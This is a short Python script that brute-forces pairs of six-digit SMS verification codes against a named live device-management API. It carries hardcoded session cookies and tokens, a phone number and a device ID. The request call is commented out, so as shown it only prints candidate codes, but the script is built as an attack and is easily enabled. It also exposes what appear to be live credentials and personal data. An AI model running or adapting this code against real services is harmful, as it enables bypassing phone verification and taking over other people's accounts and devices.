import requests


def len_zero(num):
    return ('0' * (6 - len(str(num)))) + str(num)


url = 'https://cmcc1.cloudscape.net.cn:20012/api/fdl/devices/deviceBg/getData'
headers = {
    'cookie': 'HWWAFSESTIME=1633917129599; HWWAFSESID=774972ce1115565939f; fdl_token=cSRpWDeiqJ8r0EJzGkjLhTeRli4GBqx6RrAIYwVQA5LfMmYxw2voHtUmO5NOGRFDCKLMyGYPXEMAuWn_ONT5diNjxkH6j5xKrSegJxFJglrDlZ0B3b59IKBXP8nRiN0YT0FvlYE9GhQwDAne0kXNsiNiu8qXL9lf_l9QnPnOTVlZA0k7VEjzTeazFbcY91CioB8pF3QQRLbzots7Q55b3mt-mllScTvC_YGuEkzLW74Lc8NVIw2MrTZUYaHUvlYKDLwPMCO6DKp4KYzNDKuRba1nriNwpyzDS_liW3iUDSso2Wux8qp8NWzyOrudEQ2DV_npv15Q2S-jALw4QLaByZQH-RGw963sSPO_3YAdj7Q3xTsZC3gSrg1OO8TwGL4oULm40ebAfij2cSKBpqNYQKpUVvmgTJ_2_uCCinm1ORtY0TWIrBL_x3wij6wN5flL; fdl_SESS=jYrv4RM89LlKiNtWCezUQuZGKUqUbVfayYTO7Q_WAV_5RZRtVri6d447NFrzdoAo; fdl_io=izrybE-hqfvRi_QxAABD'}

for newCode in range(0, 1000000):
    newCode_str = len_zero(newCode)
    for oldCode in range(0, 1000000):
        data = {"queryType": "checkSmsCode", "OwnerPhone": "15360412919", "newCode": newCode_str,
                "oldCode": len_zero(oldCode),
                "DeviceID": "DV1432648103957368832"}

        # result = requests.post(url, headers=headers, data=data).text
        print(newCode, ' ', oldCode)
        # if result.find('msg":"验证码不匹配') > 0:
        #     print(newCode, ' ', oldCode)
        # else:
        #     break
